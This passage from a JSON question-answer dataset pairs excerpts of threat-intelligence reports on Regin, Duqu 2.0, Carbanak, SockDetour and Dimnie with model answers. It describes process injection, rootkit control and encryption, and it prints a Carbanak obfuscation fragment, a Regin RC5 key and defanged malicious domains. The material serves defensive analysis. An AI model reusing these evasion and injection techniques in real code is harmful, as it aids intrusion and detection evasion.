strings:\n\\\\.\\mailslot\\dskInfo\nDissecorp\nBig Headline: User-mode loader - mscfg32.exe, svchost32.exe\nMD5 c3af66b9ce29efe5ee34e87b6e136e3a\nThis module opens a unique event named \"D0385CB7-B834-45d1-A501-1A1700E6C34E\". If the event exists, it waits for 10 seconds and attempts to open a \u0141le whose name can be decrypted as \"\\\\.\\MSNDSRV\". If the device \u0141le is successfully opened, the code issues a device request with IOCTL code 0x80000194 and no parameters.\nThis module uses RC5 in CBC-like mode with a key length of 96-bit for string encryption.\nCareful analysis reveals some bits of uninitialized memory found next to encryption key locations. This is unused but partly meaningful memory, because it seems to contain short chunks of strings resembling some local \u0141lepaths:\n\"rver\\8\" (probably part of \"Server\\8...\" string)\n\"LInj\" (could be a part of \"DLLInjector\" or similar)\nIt's apparent that some parts of the code were designed to run on Windows 9x, for example a call to RegisterServiceProcess Windows API function makes sense only on Windows 9x OS family, because this API function doesn't exist on Windows NT platform.\nThe module uses a unique algorithm for generating registry value names. The code contains strings, such as \"SkyhookChow Target\", that are converted to GUID-like strings by calculating SHA1 hash and using its hexadecimal representation as a string. The resulting strings are used as actual registry value names in [HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] registry key.\nSample registry value names:\nThese registry values are encrypted using an RC5 algorithm using a hardcoded 1024-bit key with 24 rounds.\nThe registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {F4CF0326-6DCDEEC8-5323-01CEDB66741A-B55F6F12} (\"SkyhookChow Payload\") should contain the location of the orchestrator DLL \u0141le (\"mscfg32.dll\"). If the value is not present a default value \"%SYSTEM%\\mscfg32.dll\" is used.\nThe registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {B6F5CD13-A74D-8B82-\nA6AA-6FA1BE2484C1-6832DF06} (\"SkyhookChow Target\") may contain the location of the executable \u0141le that will be used as a \"shell\" process for the orchestrator library.\nThe module attempts to start the \"shell\" process in suspended mode. If there is no \"SkyhookChow Target\" value or the speci\u0141ed executable fails to start, the module tries different failsafe locations of the programs that can be used instead:\n1. Default browser set in the registry [HKLM\\SOFTWARE\\Clients\\StartMenuInternet\\{current @default value}\\shell\\open\\command]\n2. %SystemRoot%\\System32\\svchost.exe\n3. %SystemRoot%\\System32\\lsass.exe\n4. Spoolsv service binary from the [HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler] ImagePath registry value.\n5. Default html \u0141le handler from [HKLM\\SOFTWARE\\Classes\\html\u0141le\\shell\\open\\command]registry value.\n6. Internet Explorer path from [HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\] IEXPLORE.EXE registry value.\nNext, the module injects extra code into a newly started target process. The injected code loads the payload DLL (\"mscfg32.dll\") into the target process and waits for the parent process to exit. When the parent process quits, it unloads the payload DLL and exits as well. The rest of the logic relies on the loaded DLL in that new process. See the description of the \"mscfg32.dll\" module below.\nThe module communicates with the Stage0/Rootkit driver \"msndsrv.sys\" by sending DeviceIoControl messages to the device \"\\\\.\\MSNDSRV\". It activates the rootkit for its own process, for the target process holding the orchestrator and for all the \u0141les involved.\n\nHow does the user-mode loader (mscfg32.exe, svchost32.exe) communicate with the Stage0/Rootkit driver (msndsrv.sys), and what specific actions does it take to ensure the payload DLL is loaded into a target process?",
    "output": "The user-mode loader (mscfg32.exe, svchost32.exe) communicates with the Stage0/Rootkit driver (msndsrv.sys) by sending DeviceIoControl messages to the device '\\\\.\\MSNDSRV'. It activates the rootkit for its own process, for the target process holding the orchestrator, and for all the files involved. The module attempts to start the 'shell' process in suspended mode and injects extra code into the newly started target process. The injected code loads the payload DLL ('mscfg32.dll') into the target process and waits for the parent process to exit. When the parent process quits, it unloads the payload DLL and exits as well. The rest of the logic relies on the loaded DLL in that new process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Conclusion\nSockDetour is a backdoor that is designed to remain stealthily on compromised Windows servers so that it can serve as a backup backdoor in case the primary one fails. It is filelessly loaded in legitimate service processes and uses legitimate processes' network sockets to establish its own encrypted C2 channel.\nWhile it can be easily altered, the compilation timestamp of the SockDetour sample we analyzed suggests that it has likely been in the wild since at least July 2019 without any update to the PE file. Plus, we did not find any additional SockDetour samples on public repositories. This suggests that the backdoor successfully stayed under the radar for a long time.\nThe plugin DLL remains unknown, but it is also expected to operate very stealthily by being delivered via the SockDetour's encrypted channel, being loaded filelessly in memory and communicating via hijacked sockets.\nAs an additional note, the type of NAS server that we found hosting SockDetour is typically used by small businesses. This example serves as a critical reminder to patch this type of server frequently when fixes are released.\nBig Headline: Protections and Mitigations\nprotects endpoints and accurately identifies the memory injector as malicious. Additionally, Cortex XDR has several detections for lateral movement and credential theft tactics, techniques and procedures (TTPs) employed by this actor set.\ncloud-based threat analysis service accurately identifies the injector used in this campaign as malicious.\nAutoFocus customers can track SockDetour activity via the  tag.\nWe advise server administrators to keep Windows servers up to date.\nThe YARA rule attached at the end of this blog can be used to detect the presence of SockDetour in memory.\nOrganizations should conduct an incident response investigation if they think they are compromised by SockDetour. If you think you may have been compromised or have an urgent matter, get in touch with the (<http://start.paloaltonetworks.com/contact-unit42.html>)Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730 or Japan: +81.50.1790.0200.\n\nQuestion: How does the SockDetour backdoor maintain its stealthiness on compromised Windows servers, and what measures can be taken to mitigate its impact?\n\nAnswer:",
    "output": "SockDetour maintains its stealthiness by being filelessly loaded into legitimate service processes and using these processes' network sockets to establish its own encrypted command and control (C2) channel. This method allows it to remain undetected for extended periods. To mitigate its impact, server administrators should ensure that Windows servers are kept up to date with the latest patches. Additionally, endpoint protection solutions like Cortex XDR can identify the memory injector as malicious and provide detections for lateral movement and credential theft tactics. Organizations should also use cloud-based threat analysis services to identify the injector used in the campaign. AutoFocus customers can track SockDetour activity via the specific tag provided. Moreover, a YARA rule can be used to detect the presence of SockDetour in memory. If an organization suspects it has been compromised by SockDetour, it should conduct an incident response investigation and contact the Unit 42 Incident Response team for assistance.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Carbanak Anunak APT use data obfuscation techniques to evade detection in its command and control communications?",
    "output": "Data obfuscation is a technique used by adversaries to make command and control traffic more difficult to detect. In the case of the Carbanak Anunak APT, the payload script uses a combination of base64 and integer-ed characters (chr) to hide malicious code. For example, the script uses the following obfuscation technique: (F9lornwzv1(\"cnVuZGxsMzIga2U=\") & \"\" & chr(29 + 85) & chr(81 + 29) & chr(-42 + 143) & chr(-76 + 184) & chr(-20 + 71) & chr(-51 + 101) & chr(67 + -23) & chr(70 + 13) & chr(-57 + 165) & chr(50 + 51) & chr(-67 + 168) & chr(53 + 59) & \"\"). This technique makes it challenging for security tools to detect the malicious code. Furthermore, the APT uses encryption with base64+RC2 to send exfiltrated data via HTTP POST messages, which adds another layer of obfuscation to its command and control communications. By using these data obfuscation techniques, the Carbanak Anunak APT can evade detection and make it harder for security teams to identify its malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What strategies did activists employ to counteract the Syrian malware attacks, and what evidence supports their efforts?",
    "output": "Activists attempted to counteract the Syrian malware attacks by carrying out Denial of Service (DoS) attacks on the RAT domains and servers. Their goal was to overwhelm the attackers' resources and cause their connections to timeout. Evidence of these efforts includes posts and warnings on social media platforms like Facebook, where activists alerted users about pro-government hacker attacks and announced their attempts to remove hacked victims by attacking the command and control (C&C) domains used by the Trojans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Stage 3 \u2013 32-bit \u2013 kernel mode manager \"VMEM.sys\"\nOn 32-bit systems, the third stage is implemented as a driver module and provides the basic functionality of the malicious framework. It is responsible for operating the encrypted virtual file system and loading additional plugins, and also provides several built-in plugins for the entire framework.\nThe module initializes the framework, sets up the plugin system and starts the actual work cycle of the malware. It also passes execution to the plugin id 50221 that is loaded from the VFS.\nBuilt-in plugins provided by this module are:\nMedium Headline: Stage 3 \u2013 64-bit\nOn 64-bit Windows systems, stage 3 is missing. Stage 2 loads the dispatcher directly from the disk and runs it.\nStage 4 (32-bit) / 3 (64-bit) \u2013 dispatcher module, 'disp.dll'\n32-bit\n64-bit\nThe dispatcher library is the user-mode core of the framework. It is loaded directly as the third stage of the 64-bit bootstrap process, or extracted and loaded from the VFS as module 50221 as the fourth stage on 32-bit systems.\nIt implements a set of internal plugins:\nThe dispatcher takes care of the most complicated tasks of the Regin platform, such as providing an API to access virtual file systems, basic communications and storage functions, as well as network transport subroutines. In essence, the dispatcher is the brain that runs the entire platform.\nMedium Headline: Stage 4 \u2013 Virtual File Systems (32/64-bit)\nThe most interesting code from the Regin platform is stored in encrypted file storages, known as Virtual File Systems (VFSes).\nDuring our analysis we were able to obtain 24 VFSes from multiple victims around the world. Generally, these have random names and can be located in several places in the infected system:\nEach VFS has a structure that is very similar to a real disk file system such as FAT. The VFS files start with a header that provides basic information required to operate the file system. The header is followed by the bitmap of used/ free sectors and then by the file table.\nFiles are described by file table entries:\nEach sector starts with a 32-bit integer that is the offset of the next sector of the file.\nAn example:\n\u2022 File record at offset 0x122, file ID 50221, offset of the first sector 0x7B13\n\u2022 Sector at 0x7B13, next sector at 0x7D13\n\u2022 Sector at 0x7D13, next sector at 0x7F13,\n\u2022 Sector at 0x7F13, next sector at 0x8113, etc.\nExample of Regin VFS parsing\nAlthough the structures of the file system are unencrypted, the file entries are encrypted. The encryption algorithm used is RC5, and many records are also compressed using the nrv2e algorithm from the UCL library. UCL is an open source implementation of the proprietary NRV ('Not Really Vanished') compression algorithm, and was originally used by the UPX tool. The reason why the attackers chose UCL is simple: it's small, compact and requires little to no additional memory for decompression.\nEach VFS we encountered was encrypted with a 16 bytes key, which can vary from victim to victim. Based on our experience, most files were however encrypted with the same key, {73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01} stored in the dispatcher module or VMEM.sys kernel core.\nVFS RC5 decryption key inside the dispatcher module (disp.dll)\nIn all, we observed about a dozen different VFS keys.\nThe following plugins were observed inside the VFSes we collected. These are all identified by a 16-bit number. The plugins are referenced by these numbers; they are like filenames on a normal file system and allow the dispatcher to easily load or reference them.\nThe binary modules are referenced by these numbers as plugin identifiers and usually have similar internal DLL names; e.g., the plugin with ID '50121' will have the internal name '50121.dll' in its export table. Compressed binary modules are accompanied by binary files with the same ID. These files contain the size of the decompressed module and are not included in the description.\nKnown data blocks and their configuration IDs:\nKnown executable modules and their plugin IDs:\nThe attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute. For example, only some of the VFSes we have seen had lateral movement modules, designed for infecting other computers in the network.\n\nQ: How does the Regin malware handle the transition between stages on 32-bit and 64-bit systems, and what role does the dispatcher module play in this process?",
    "output": "A: On 32-bit systems, the third stage of the Regin malware is implemented as a driver module called 'VMEM.sys', which initializes the framework, sets up the plugin system, and starts the work cycle of the malware. It then passes execution to the plugin with ID 50221, which is loaded from the Virtual File System (VFS). On 64-bit systems, the third stage is missing; instead, stage 2 directly loads the dispatcher module from the disk and runs it. The dispatcher module, 'disp.dll', acts as the user-mode core of the framework. It is responsible for the most complicated tasks, including providing an API to access virtual file systems, handling basic communications and storage functions, and managing network transport subroutines. Essentially, the dispatcher is the brain that runs the entire Regin platform.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.3. AES encryption of the configuration file\nThe analyzed main module of Duqu 2.0 and also the old Duqu sample reads configuration information from a special file. This configuration file is encrypted using the AES block cipher in CBC mode with a CTS-like (Ciphertext Stealing) encryption of the last two cleartext blocks. The format of the configuration file will be discussed in details in the next chapter.\nBefore the encryption of the configuration file, an AES wrapper object is created. This C++ object represents the context (parameters) of the encryption. Therefore, it also stores the initialization vector (IV) of the encryption, the key of the cipher and the data to be encrypted.\nThe structure of this object's class can be seen in the upper part of the next screenshot:\nAs we can see, the allocated memory area of an instance of the \"aeswrapper\" structure (class) starts with a 16 bytes (128 bits) IV value (of course, the size of the IV equals the size of an AES input block). It is followed by a 516-byte buffer (or other unused smaller attributes) which can store the encryption key of the AES cipher. Size of this encryption key can be either 128, 192 or 256 bits (16, 24 or 32 bytes). The last 4 bytes of the \"aeswrapper\" structure contains the pointer to the data to be encrypted.\nIn addition to the attributes (IV, encryption key, pointer to a data buffer), the \"aeswrapper\" class also contains methods. The most important methods are the \"encrypt\" and \"initialize\" functions. As the name shows, the initialize method initializes the context (parameters) of the encryption, therefore it sets the IV, key and data members of the \"aeswrapper\" object. The IV is generated by \"hand\", but the key is prepared from an initial key using the prepare_key function. The encrypt method encrypts the data in the modified CBC-CTS-like mode. The method uses an AES encryptor function. The nth_block method of the class gives back a pointer to the n-th block of the data to be encrypted. Finally, the \"aeswrapper\" class uses the last_block function to perform the CTS-like encryption mechanism at the end. The function gives back a pointer not to the last partial (smaller than 16 bytes) input block, but to the last 16 bytes of the input data buffer.\nThe implementation of AES prepare_key and encrypt methods are presumably copied from function libraries.\nThe figure above shows the structures (structures of class instances) which we identified and which are related to the encryption routine and the AES initialization, and the putative attributes of these structures (classes). Using these structures, the disassembled code can be more readable.\nThere is another structure in addition to the \"aeswrapper\" class called \"aes\" on the screenshot above. An instance of this class represents an AES encryptor object. It has probably 3 attributes: key_schedule, precomputed and iteration_count.\nIn the following table, we can see the AES initialization routine (of the configuration file encryption) of the old Duqu (on the left) and the new Duqu 2.0 sample (on the right) at assembly code level. The decompiled code of the initialization function (for both malware samples) can be seen in figure Sample 6. The AES initialization function initializes the mentioned \"aeswrapper\" object, it sets the data buffer, prepares the encryption key, and finally, generates the IV based on the magic constant.\nSample 4 \u2013 IV generation routine comparison (assembly view) \u2013 magic constants\nIn both cases, the highlighted part of the assembly code corresponds to the highlighted part of the initialization routines in the decompiled versions of the code, which can be seen in figure Sample 6. The only difference between the highlighted parts is the values of the magic constants (\"0xDEADBABE\" vs. \"0x248561EF\") which are used for the generation of the 128-bit initialization vectors. The mentioned AES initialization routines (and also the common encryption function) will be discussed later in this section in more details.\nWe also reverse engineered the encryption routine used by Duqu 2.0, which is illustrated in the following block diagram:\nWith the exception of the last two input blocks, consecutive blocks of the cleartext data are encrypted with the AES encryption algorithm in CBC mode. Accordingly, the first block of the input data (\"P[0]\") is XORed with a fixed initialization vector (named as \"Fixed IV\" in the figure above). This 128-bit initialization vector (IV) differs between the old Duqu and the new Duqu 2.0 samples. The value of this IV is generated from a magic constant, as it can be seen in the highlighted parts of the previous assembly code. As this magic constant is different in the old and new samples, the generated IV will also be different.\nThe result of the previously mentioned XOR operation gives the first input block of the AES encryption algorithm (\"AES-256\" is in use). The number 256 means that the AES algorithm has 256-bit key size. The block size of the AES cipher is constant 128 bits (16 bytes). \"E[0]\" is the first output of the block cipher, so it will be the first encrypted block (\"F[0]\").\nOutput of the block cipher (\"E[0]\") is then XORed with the second input block (\"P[1]\"), and the resulting block will be encrypted with AES-256. This procedure continues until the encryption of the last but first block of the cleartext data.\nIf the size of the input data is an integer multiple of the block size of AES (i.e., 128 bits), then the remaining last two blocks of the cleartext are encrypted in the same manner as the previous input blocks. So, in this case, the whole encryption routine matches a simple CBC mode encryption.\nHowever, if the size of the input data is not an exact multiple of the AES block size, the last partial block of the input data needs padding to be completed to a full block. In case of Duqu 2.0, the developers of the malware didn't use padding in a traditional way. Instead, they use a CTS-like (Ciphertext Stealing) method. The essence of the method used by the encryption routine is that a part of the last but first block of the input data is encrypted twice using AES.\nThe last but first block (\"P[n-1]\") of the cleartext data is XORed with the previous ciphertext block (\"E[n-2]\") and encrypted with AES-256 as previously. The result of this operation is the \"E[n-1]\" output block. The \"E[n-1]\" output block won't be directly used as the (n-1)st ciphertext block. Instead, the output \"E[n-1]\" is splitted into two distinct parts: \"F[n-1]\" and another part which is then fed into the AES encryptor again.\nThe last cleartext partial block (\"P[n]\") \u2013 which has size less than 16 bytes \u2013 is completed from its beginning to get a full AES input block. The data used for completing the last partial block is taken from the end of the previous AES output block (\"E[n-1]\"). The resulting block will be fed into the AES-256 cipher in the last step of the encryption process. The output of the last invocation of the AES cipher will be the last ciphertext block (\"F[n]\"). The output of the last but first invocation of the AES encryptor (\"E[n-1]\") is split into two parts, and the first part of size size_of_the_last_cleartext_block will be the (n-1)st ciphertext block (\"F[n1]\").\nThe old Duqu samples used exactly the same encryption method. The decompiled code of the AES encryptor of Duqu can be seen in the following sample, and one can see that this code implements the method we have just explained and illustrated in the block diagram of Figure 8.\nSample 5 \u2013 Main file encryption routine (same in the new and old sample) with implementation bugs \u2013 highlighted (red comments)\nThe next table compares the AES initialization routines of the old Duqu sample (upper part of the table) and the main module of Duqu 2.0 (lower part of the table).\nFirst, the initialization routine copies the pointer of the input data buffer into the \"data\" member of the \"aeswrapper\" object. The routine takes this pointer as its second parameter. The first parameter is the pointer (reference) of the object instance, since in C++, the first (hidden) parameter of a (non-static) class method is always the pointer of the object, or in other words, the \"this\" pointer. In case of Duqu 2.0, the routine has a third parameter, the pointer to the buffer containing the key.\nAfter that, the content of the \"key\" buffer (which is a global buffer in the first case) is copied into the local \"key_\" buffer in both cases. Then the prepare_key method of the AES object prepares the final encryption key based on this key, and feeds it into the \"aeswrapper\" object. Invocation of the prepare_key method can also be seen in the assembly view (see Sample 4.), the method is referred by the name AES1_sub_2F9B1 in case of Duqu and AES_1_sub_1001690A in case of Duqu 2.0. In the Duqu 2.0 case, the function has one more parameter, as this can also be seen in the assembly view, and the length of the AES key is chosen as 256 bits.\nFinally, the remaining part of the code initializes the IV member of \"aeswrapper\" object. Every byte of the IV is generated by XORing the index of the actual byte with a magic constant (\"0xDEADBABE\" and \"0x248561EF\", respectively, in the two cases). Byte index starts from zero.\nSample 6 \u2013 Old Duqu and new Duqu 2.0 encryption initialization routine with differences \u2013 highlighted (red comments)\nAs we can see, there are only three small differences between the routines: the magic constants used by the IV generation, the fact that in Duqu the key is a constant global variable with fixed value while in Duqu 2.0 it is an argument of the initialization function, and finally, the possible length of the key.\nIn case of Duqu, the prepare_key function assumes that the key is always 256 bits, while in case of Duqu 2.0, the prepare_key function takes the key length as an argument. Key length can be 128, 192 or 256 bits.\n\nWhat is the significance of the 'aeswrapper' class in the AES encryption process used by Duqu 2.0, and how does it manage the encryption context?",
    "output": "The 'aeswrapper' class in Duqu 2.0 is significant because it represents the context (parameters) of the AES encryption. It stores the initialization vector (IV), the encryption key, and a pointer to the data to be encrypted. The class includes methods such as 'initialize' and 'encrypt'. The 'initialize' method sets up the IV, key, and data members, while the 'encrypt' method performs the actual encryption using a modified CBC-CTS-like mode. Additionally, the class uses methods like 'nth_block' and 'last_block' to handle the encryption process efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix B: Associated Domains\n1c-host[.]host\n1cpred[.]org\nallforest[.]pw\nantiprt[.]com\natonix[.]pw\nbabbabbab[.]ru\nbabbabbab2[.]ru\nbabbebbab[.]com\nbabbebbab2[.]com\nbabbibbab2[.]ua\nbabbihbab[.]host\nbabblabbab2[.]link\nbabblahbab[.]com\nbabblebbab[.]pw\nbabblebbab2[.]pw\nbabblehbab[.]top\nbabblibbab2[.]xyz\nbabblihbab[.]link\nbabblohbab[.]pw\nbabblulbab[.]pw\nbabbobbab[.]link\nbabbohbab[.]com\nbabbolbab[.]host\nbabbolbab[.]ru\nbabbrabbab2[.]xyz\nbabbrebbab[.]rocks\nbabbrebbab2[.]rocks\nbabbrehbab[.]pw\nbabbribbab2[.]space\nbabbrihbab[.]xyz\nbabbrohbab[.]rocks\nbabbrulbab[.]rocks\nbabbulbab[.]com\nbabchabbab[.]org\nbabchabbab2[.]org\nbabchebbab2[.]ru\nbabchehbab[.]in\nbabchibbab[.]com\nbabchihbab[.]org\nbabcholbab[.]org\nbabclabbab2[.]space\nbabclebbab[.]biz\nbabclebbab2[.]biz\nbabclehbab[.]rocks\nbabclibbab2[.]in\nbabclihbab[.]space\nbabclohbab[.]biz\nbabclulbab[.]biz\nbabcrabbab2[.]in\nbabcrambab[.]ru\nbabcrebbab[.]org\nbabcrebbab2[.]org\nbabcrehbab[.]biz\nbabcribbab[.]ru\nbabcrihbab[.]in\nbabcrohbab[.]org\nbabcruhbab[.]host\nbabcrulbab[.]org\nbabdabbab[.]ua\nbabdabbab2[.]ua\nbabdebbab[.]link\nbabdebbab2[.]link\nbabdibbab2[.]pw\nbabdihbab[.]top\nbabdobbab[.]xyz\nbabdohbab[.]link\nbabdolbab[.]top babdrabbab2[.]ru babdrambab[.]ua babdrebbab[.]com babdrebbab2[.]com babdrehbab[.]org babdribbab[.]ua babdrihbab[.]host babdrohbab[.]com babdruhbab[.]top babdrulbab[.]com babdulbab[.]link babfabbab[.]pw babfabbab2[.]pw babfebbab[.]top babfebbab[.]xyz babfebbab2[.]xyz babfibbab2[.]rocks babfihbab[.]pw babflabbab2[.]ua babflambab[.]pw babflebbab[.]link babflebbab2[.]link babflehbab[.]com babflibbab[.]pw\nbabflihbab[.]top\nbabflohbab[.]link\nbabfluhbab[.]pw\nbabflulbab[.]link\nbabfobbab[.]space babfohbab[.]xyz babfolbab[.]pw babfrabbab2[.]pw babfrebbab[.]xyz babfrebbab2[.]xyz babfrehbab[.]link babfribbab[.]rocks babfrihbab[.]pw babfrohbab[.]xyz babfrulbab[.]xyz babfulbab[.]xyz babgabbab2[.]rocks babgebbab[.]space babgebbab2[.]space babgibbab2[.]biz babgihbab[.]rocks babglabbab2[.]rocks babglebbab[.]space babglebbab2[.]space babglehbab[.]xyz babglibbab[.]biz babglihbab[.]rocks babglohbab[.]space babglulbab[.]space babgobbab[.]in babgofbab[.]biz babgohbab[.]space\nbabgrabbab2[.]biz\nbabgrebbab[.]in\nbabgrebbab2[.]in\nbabgrehbab[.]space\nbabgribbab[.]org\nbabgrihbab[.]biz\nbabgrohbab[.]in\nbabgrulbab[.]in\nbabgulbab[.]space\nbabhabbab2[.]biz\nbabhebbab[.]in\nbabhebbab2[.]in\nbabhibbab2[.]org\nbabhihbab[.]biz\nbabhohbab[.]in\nbabhulbab[.]in\nbabjabbab2[.]org\nbabjebbab[.]ru\nbabjebbab2[.]ru\nbabjibbab2[.]com\nbabjihbab[.]org\nbabjohbab[.]host\nbabjulbab[.]host\nbabkabbab2[.]com\nbabkebbab[.]ua\nbabkebbab2[.]ua\nbabkehbab[.]host\nbabkibbab2[.]link\nbabkihbab[.]com\nbabkohbab[.]top\nbabkulbab[.]top\nbablabbab2[.]link\nbablebbab[.]pw\nbablebbab2[.]pw\nbablehbab[.]top\nbablibbab2[.]xyz\nbablihbab[.]link\nbablohbab[.]pw\nbablulbab[.]pw\nbabmabbab[.]xyz\nbabmabbab2[.]xyz\nbabmebbab[.]rocks\nbabmebbab2[.]rocks\nbabmehbab[.]pw\nbabmibbab2[.]space\nbabmihbab[.]xyz\nbabmilbab[.]pw\nbabmohbab[.]rocks\nbabmulbab[.]rocks\nbabnabbab2[.]space\nbabnebbab[.]biz\nbabnebbab2[.]biz\nbabnehbab[.]rocks\nbabnibbab2[.]in\nbabnihbab[.]space\nbabnohbab[.]biz\nbabnulbab[.]biz\nbabpabbab2[.]in\nbabpebbab[.]org\nbabpebbab2[.]org\nbabpehbab[.]biz\nbabpibbab2[.]ru\nbabpihbab[.]in\nbabplabbab2[.]org\nbabplebbab[.]ru\nbabplebbab2[.]ru\nbabplehbab[.]in babplibbab[.]com babplifbab[.]ru babplihbab[.]org babplohbab[.]host babplulbab[.]host babpohbab[.]org babprabbab2[.]com babprebbab[.]ua babprebbab2[.]ua babprehbab[.]host babpribbab[.]link babprihbab[.]com babprulbab[.]top babpulbab[.]org babrabbab2[.]ru babrebbab[.]com babrebbab2[.]com babrehbab[.]org babribbab2[.]ua babrihbab[.]host babrohbab[.]com babrulbab[.]com babsabbab2[.]ua babsahbab[.]host babsebbab[.]link babsebbab2[.]link\nbabsehbab[.]com\nbabsibbab2[.]pw\nbabsihbab[.]top\nbabskabbab2[.]link\nbabskebbab[.]pw\nbabskebbab2[.]pw\nbabskehbab[.]top\nbabskibbab[.]xyz\nbabskihbab[.]link\nbabslabbab2[.]xyz\nbabslebbab2[.]rocks\nbabslehbab[.]pw\nbabslibbab[.]space\nbabslihbab[.]xyz\nbabsmabbab2[.]space\nbabsmebbab2[.]biz\nbabsmehbab[.]rocks\nbabsmibbab[.]in\nbabsmihbab[.]space\nbabsnabbab2[.]in\nbabsnebbab2[.]org\nbabsnehbab[.]biz\nbabsnibbab[.]ru\nbabsnihbab[.]in\nbabsofbab[.]pw\nbabsohbab[.]link\nbabspabbab[.]ru\nbabspabbab2[.]ru\nbabspebbab2[.]com\nbabspefbab[.]ru\nbabspehbab[.]org\nbabspibbab[.]ua\nbabspihbab[.]host\nbabspolbab[.]host\nbabstabbab[.]ua\nbabstabbab2[.]ua\nbabstebbab2[.]link\nbabstefbab[.]com\nbabstehbab[.]com\nbabstibbab[.]pw\nbabstihbab[.]top\nbabstolbab[.]top\nbabstrabbab[.]pw\nbabstrabbab2[.]pw\nbabstrebbab2[.]xyz\nbabstrefbab[.]pw\nbabstrehbab[.]link\nbabstribbab[.]rocks\nbabstrihbab[.]pw\nbabstrolbab[.]pw\nbabsulbab[.]link\nbabswabbab[.]rocks\nbabswabbab2[.]rocks\nbabswebbab2[.]space\nbabswehbab[.]xyz\nbabswibbab[.]biz\nbabswihbab[.]rocks\nbabswolbab[.]rocks\nbabtabbab2[.]pw\nbabtahbab[.]top\nbabtebbab[.]xyz\nbabtebbab2[.]xyz\nbabtehbab[.]link\nbabtibbab2[.]rocks\nbabtihbab[.]pw\nbabtohbab[.]xyz\nbabtrabbab[.]biz\nbabtrabbab2[.]biz\nbabtrebbab2[.]in\nbabtrehbab[.]space\nbabtribbab[.]org\nbabtrihbab[.]biz\nbabtrolbab[.]biz\nbabtulbab[.]xyz\nbabvabbab2[.]rocks\nbabvahbab[.]pw babvebbab[.]space babvebbab2[.]space babvehbab[.]xyz babvibbab2[.]biz babvihbab[.]rocks babvohbab[.]space babvulbab[.]space\nbabwabbab2[.]biz\nbabwahbab[.]rocks\nbabwebbab[.]in\nbabwebbab2[.]in\nbabwehbab[.]space\nbabwibbab2[.]org\nbabwihbab[.]biz\nbabwohbab[.]in\nbabwulbab[.]in\nbabyabbab2[.]org\nbabyahbab[.]biz\nbabyebbab[.]ru\nbabyebbab2[.]ru\nbabyehbab[.]in\nbabyibbab2[.]com\nbabyihbab[.]org\nbabyohbab[.]host\nbabyulbab[.]host\nbabzabbab2[.]com\nbabzahbab[.]org\nbabzebbab[.]ua\nbabzebbab2[.]ua\nbabzehbab[.]host\nbabzibbab2[.]link babzihbab[.]com babzohbab[.]top babzulbab[.]top bannarbor[.]pw bisquitshore[.]xyz bitrixon[.]biz buhgalter[.]pw\nbuhgalter[.]rocks\nbuhgalters[.]xyz\nbusinessolution[.]site\ncheturion[.]org\nchipacom[.]net\ncloneduring[.]pw\ncompanysafa[.]biz\ncorpofname[.]pw\ndatamining[.]press\ndersteoyna[.]pw\ndovnikus[.]su\nefros[.]pw\nflashclicks[.]info\nforbusinessgo[.]xyz\nfortificar[.]net\nfracking[.]host\ngateoflife[.]pw\ngaz[.]rocks\ngedealer[.]pw\nglobuspp[.]pw\ngrandvita[.]pw\ngreenlanterns[.]xyz\ngreenworldsun[.]xyz\nguardomorph[.]com\nguwang[.]pw\njobforreborn[.]xyz\nkokinatsu[.]pw\nkukuzaki[.]me\nkupala[.]me\nlastsnow[.]link\nmaradonianos[.]pw\nmercurytod[.]pw\nmuxa[.]club\nmycorpsafa[.]biz\nn-nalog78[.]com\nnewsunconcept[.]in\nnewsupport[.]us\nnothingmore[.]us\nnovayarabota[.]pw\nnvpn[.]pw\nodejda77[.]net okvd[.]biz\nolen[.]bid\nonechat[.]pw\nplacetobuy[.]pw\nplatej[.]pw\npoplata-da[.]org\nportw[.]org\npowersand[.]link\npricemeet[.]pw\npuldisk[.]xyz\nrabotadnya[.]pw\nraintor[.]pw\nricarier[.]org\nrosgaz[.]pw\nrumoney[.]xyz\nsalesforlife[.]top\nsalesline[.]top\nsam-sam[.]pw\nsandstyle[.]biz\nsandw[.]pw\nsantrimo[.]lol\nseclist[.]site\nseclist[.]top\nselenaspace[.]space\nsellgrax[.]club\nsemodo[.]pw\nsensetunoespossible[.]cat\nshortsell[.]trade\nshortselling[.]club\nsixgoats[.]pw\nsnp500[.]trade\nsolotender[.]pw\nsslprivate[.]org\ntapalulumba[.]com\ntaskhoper[.]com\ntitleworld[.]pw\ntorglend[.]com\ntradertop[.]top\ntrendkop[.]pw\ntyuocruz1312[.]net\nuchet[.]pw\nuchet[.]space\nvisitpalace[.]xyz\nvolumexp[.]xyz\nvortexenism[.]biz\nvpnserv[.]pw\nvwv.flashclicks[.]info\nwinsocket[.]xyz\nyearreviews[.]net\nUpdated 3/30/17: To remove unnecessary IPS Signature number.\nRead the text above and answer this question: How does the use of multiple domains in the Dimnie campaign align with common tactics employed by advanced persistent threats (APTs), and what implications does this have for cybersecurity defenses?",
